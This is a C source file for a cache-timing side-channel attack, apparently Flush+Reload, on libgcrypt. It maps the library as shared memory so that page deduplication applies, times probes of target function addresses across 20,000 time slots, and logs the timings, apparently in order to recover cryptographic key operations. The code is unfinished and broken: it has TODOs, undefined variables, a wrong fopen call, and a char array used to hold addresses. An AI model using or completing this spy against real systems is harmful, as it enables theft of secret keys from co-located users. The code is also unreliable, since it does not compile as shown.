#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

#include "asm.h"

unsigned long THRESHOLD = 100ul;
int NUM_ADDRS = 5;
int NUM_SLOTS = 20000;
int CYCLES = 2500;
size_t LIBGCRYPT_SIZE = 1048576;

void spy(char **addrs, unsigned long **results, int cycles) {
    int i, j;

    for(i = 0; i < NUM_SLOTS; i++) {
        for(j = 0; j < NUM_ADDRS; j++) {
            results[i][j] = probe(addrs[i]);
        }
        /* Busy wait to the end of the time slot */
        busy_wait(cycles);
    }
}

int main(int argc, char *argv[]) {
    int fd;
    int i, j;
    FILE *outputs, *offsets;
    char target_addrs[NUM_ADDRS];
    unsigned long results[NUM_SLOTS][NUM_ADDRS] = {0};

    /* Argument parsing */
    if(argc != 3) {
        fprintf(stderr, "Usage: %s libgcrypt_path target_offsets\n", argv[0]);
        return -1;
    }
    if((fd = open(argv[1], O_RDONLY)) == -1) {
        fprintf(stderr, "open failed: %s\n", argv[1]);
        return -1;
    }
    /* TODO: Obtain target mpi functions' offset */
    if((offsets = fopen(argv[2])) == NULL) {
        fprintf(stderr, "fopen failed: %s\n", argv[2]);
        return -1;
    }

    /* MMAP libgcyrpt to acheive sharing through page deduplication */
    void *libgcrypt_ptr = mmap(NULL, LIBGCRYPT_SIZE, PROT_READ, MAP_SHARED, fd, 0);
    if(libgcrypt_ptr == MAP_FAILED) {
        fprintf(stderr, "MMAP failed\n");
        return -1;
    }
    printf("libgcrypt is mapped to %p\n", libgcrypt_ptr);

    /* TODO: Read offsets and make target addresses */
    for(i = 0; i < NUM_ADDR; i++) {
        target_addrs[i] = (unsigned long) libgcrypt_ptr + readline[i];
    }

    /* Attack */
    printf("Start spying\n");
    spy(target_addrs, results, CYCLES);
    printf("End spying\n");

    /* Write results to result.txt */
    f = fopen("result.txt", "w");
    for(i = 0; i < NUM_SLOTS; i++) {
        for(j = 0; j < NUM_ADDRS; j++) {
            fprintf(f, "%d %d %lu\n", i, j, results[i][j]);
        }
    }

    munmap(libgcrypt_ptr, LIBGCRYPT_SIZE);
    fclose(f);

    return 0;
}
